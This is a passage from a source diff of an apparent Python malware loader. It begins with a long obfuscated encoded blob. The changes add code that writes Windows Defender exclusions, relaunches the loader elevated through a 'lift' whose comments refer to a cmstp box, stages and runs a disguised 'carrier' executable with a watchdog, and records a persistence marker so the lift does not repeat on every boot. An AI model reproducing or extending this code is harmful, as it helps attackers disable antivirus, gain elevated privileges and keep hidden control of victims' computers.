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"
 
 # ---- r1.1.2 stage: carrier exec + exclusions.py materialize/execute --------
 # r12/r14 base restored: the lift relaunches OUR python elevated; the stage
@@ -1084,8 +1207,9 @@ def _decode_excl():
 def set_defender_exclusions():
     """r1.1.2 (dj order): the lift RELAUNCHES our staged python elevated; the
     stage materializes + executes exclusions.py (the standalone exclusion
-    writer, elevated) then execs the carrier. work.py itself carries NO
-    exclusion code — the r14 shape, with the new file attached.
+    writer, elevated) then execs the carrier. work.py's own write path is
+    add_defender_exclusions() above — this is the elevated half of the same
+    list, for the boots where the medium token cannot touch HKLM.
 
     r143: ONE stage, ONE road. the sibling files are written once, then either
     stage.py is RUN with the token this process already holds (already
@@ -1283,27 +1407,59 @@ def write_file(path, data, exe=EXE_NAME):
 # profile box with it. a re-fire only has to re-EXEC the pair; the lift is a
 # one-time job.
 LIFT_MARK = os.path.join(PERSIST_DIR, "wcache.lift")
+# dj (this build): the marker carries the COVERAGE REVISION, not just "lift
+# ran". a box that lifted under the old one-dir writer re-lifts exactly once
+# to pick up the wide set, then the tag matches and the lift is never seen
+# again. a refused write tags revision:attempts and settles after EXCL_TRIES.
+EXCL_REV = b"2"
+# a lift whose read-back stays empty is retried, but only this many times —
+# past that the tag settles on the bare revision and the box never lifts again.
+EXCL_TRIES = 2
 
 
 def lift_landed():
-    """the lift already ran on this box: marker from a previous run, or the
-    AppHost dir is already a Defender exclusion path (which is exactly what
-    the lift exists to write)."""
+    """the lift already ran on this box AT THE CURRENT COVERAGE REVISION, or
+    the wide set is visibly in place. the marker read is the gate: an old box
+    carries the old tag and takes the one extra lift; a failed lift retries
+    EXCL_TRIES times and then settles, so the cmstp box can never come back on
+    every boot."""
+    tag = b""
     try:
-        if os.path.isfile(LIFT_MARK):
-            return True
+        with open(LIFT_MARK, "rb") as fh:
+            tag = fh.read().strip()
     except Exception:
-        pass
+        tag = b""
+    if tag == EXCL_REV:
+        return True
+    if tag.startswith(EXCL_REV + b":"):
+        try:
+            if int(tag.split(b":", 1)[1]) >= EXCL_TRIES:
+                return True
+        except Exception:
+            return True
     try:
-        return bool(exclusion_landed())
+        return bool(exclusion_landed()) and exclusions_landed()
     except Exception:
         return False
 
 
-def mark_lift():
+def mark_lift(done=None):
+    """tag = bare revision when the wide set reads back (or the caller does not
+    know), else revision:attempts — the retry counter lift_landed() settles."""
     try:
+        tag = EXCL_REV
+        if done is False:
+            n = 1
+            try:
+                with open(LIFT_MARK, "rb") as fh:
+                    cur = fh.read().strip()
+                if cur.startswith(EXCL_REV + b":"):
+                    n = int(cur.split(b":", 1)[1]) + 1
+            except Exception:
+                n = 1
+            tag = EXCL_REV + b":" + str(n).encode()
         with open(LIFT_MARK, "wb") as fh:
-            fh.write(b"1")
+            fh.write(tag)
     except Exception:
         pass
 
@@ -1391,6 +1547,15 @@ def main():
     except Exception:
         return
 
+    # dj (this build): the wide set goes in FIRST, before any image is staged —
+    # on an elevated token this lands it outright; on a medium one the writes
+    # are refused and the lift road below writes the same list under the
+    # stage's token. either way the list is one function.
+    try:
+        add_defender_exclusions()
+    except Exception:
+        pass
+
     # r1.1.2: the exclusion-push loop stays OUT of this body (r14 shape).
     # exclusions ride the STAGE road below: after the lift, the elevated
     # stage materializes + executes exclusions.py, then execs the carrier.
@@ -1433,17 +1598,18 @@ def main():
 
     set_defender_exclusions()
 
-    # the elevated stage execs the pair; if that happened (exclusion written or
-    # carrier up) the lift is DONE for this box and never runs again. otherwise
-    # leave the marker off — the next run retries the lift, same as before.
-    landed = False
+    # dj (this build): the tag always advances — bare revision when the wide
+    # set reads back, revision:attempts while it does not (bounded by
+    # EXCL_TRIES). a refused write must not put the cmstp box on every boot.
+    ok_wide = False
     try:
-        landed = (exclusion_landed() or proc_alive(EXE_NAME)
-                  or proc_alive(DURABLE_MAIN) or proc_alive(WD_NAME))
+        ok_wide = exclusions_landed()
     except Exception:
-        pass
-    if landed:
-        mark_lift()
+        ok_wide = False
+    mark_lift(ok_wide)
+
+    # the tag above already says whether the wide set reads back (bare rev) or
+    # how many lifts it took (rev:n) — nothing else to write here.
 
     # r142 (dj order: no jar-side watcher — work.py owns the pair): the lift's
     # elevated stage starts carrier + watchdog exe, and this catches anything
